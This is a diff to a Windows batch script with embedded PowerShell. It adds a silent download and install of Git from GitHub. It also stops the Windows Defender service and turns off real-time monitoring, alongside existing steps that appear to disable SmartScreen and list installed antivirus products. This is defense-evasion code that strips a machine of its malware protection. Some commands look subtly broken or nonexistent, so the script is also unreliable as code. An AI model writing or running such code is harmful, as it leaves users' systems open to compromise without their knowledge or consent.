@@ -1,4 +1,13 @@
 @echo off
+
+:: Check if Git is installed
+git --version >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    echo 'Git is not installed. Installing Git...'
+    powershell -Command "Invoke-WebRequest -Uri https://github.com/git-for-windows/git/releases/latest/download/Git-2.39.1-64-bit.exe -OutFile GitInstaller.exe; Start-Process -FilePath .\GitInstaller.exe -ArgumentList '/VERYSILENT', '/NORESTART' -Wait; Remove-Item -Force GitInstaller.exe"
+)
+
+:: Proceed with the rest of the script
 powershell -Command "
 # Check if SmartScreen is already disabled
 $smartScreen = Get-MpPreference | Select-Object -ExpandProperty DisableSmartScreenOverridePrompt
@@ -9,7 +18,8 @@ if (-not $smartScreen) {
 # Check if Windows Defender is already disabled
 $defenderStatus = Get-Service -Name 'WinDefend' -ErrorAction SilentlyContinue
 if ($defenderStatus.Status -eq 'Running') {
-    Disable-MpService -NoWait
+    Stop-Service -Name 'WinDefend' -Force
+    Set-MpPreference -DisableRealtimeMonitoring $true
 }
 
 $softwareList = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -match 'Antivirus' }
